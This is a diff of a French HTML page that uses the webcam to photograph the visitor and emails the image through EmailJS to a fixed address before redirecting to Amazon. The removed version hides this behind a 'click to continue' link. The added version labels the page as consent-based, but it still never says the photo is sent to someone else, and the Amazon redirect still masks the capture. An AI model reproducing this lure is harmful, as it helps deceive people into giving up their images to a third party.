@@ -1,51 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Photo automatique</title>
+  <title>Photo avec consentement</title>
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
     emailjs.init("mxm3fFA_BxEhqJieq"); // Clé publique EmailJS
   </script>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
+    #status { margin-top: 20px; font-weight: bold; }
+    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+  </style>
 </head>
 <body>
-  <a id="autoLink" href="#">Cliquez ici pour continuer</a>
+  <h2>Cliquez pour prendre une photo et continuer</h2>
+  <button id="startButton">Prendre la photo</button>
+  <div id="status"></div>
   <video id="video" autoplay style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    document.getElementById("autoLink").onclick = async (e) => {
-      e.preventDefault(); // Empêche le comportement normal du lien
+    const button = document.getElementById("startButton");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const status = document.getElementById("status");
 
-      const video = document.getElementById("video");
-      const canvas = document.getElementById("canvas");
+    button.onclick = async () => {
+      button.style.display = 'none'; // Masquer le bouton
+      status.textContent = "Demande de permission pour la caméra...";
 
       try {
+        // Demande la caméra frontale
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
 
         // Petit délai pour que la caméra démarre
         await new Promise(resolve => setTimeout(resolve, 1000));
 
-        // Prendre la photo
+        // Capture de la photo
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext("2d").drawImage(video, 0, 0);
         const imageBase64 = canvas.toDataURL("image/jpeg");
 
-        // Envoyer via EmailJS
+        status.textContent = "Envoi de la photo...";
+
+        // Envoi via EmailJS
         await emailjs.send("service_8cs0gml", "template_hgvdx1g", {
           to_email: "destinataire@email.com",
-          message: "Photo automatique",
+          message: "Photo prise avec consentement",
           attachment: imageBase64
         });
 
-        // Arrêter la caméra
+        // Arrêt de la caméra
         stream.getTracks().forEach(track => track.stop());
 
-        // Redirection vers Amazon
-        window.location.href = "https://www.amazon.com";
+        // Message et redirection
+        status.textContent = "Photo envoyée ! Redirection vers Amazon...";
+        setTimeout(() => { window.location.href = "https://www.amazon.com"; }, 1500);
+
       } catch (err) {
-        alert("Erreur ou caméra refusée : " + err);
+        status.textContent = "Erreur ou caméra refusée : " + err;
+        button.style.display = 'inline-block'; // Remettre le bouton
       }
     };
   </script>
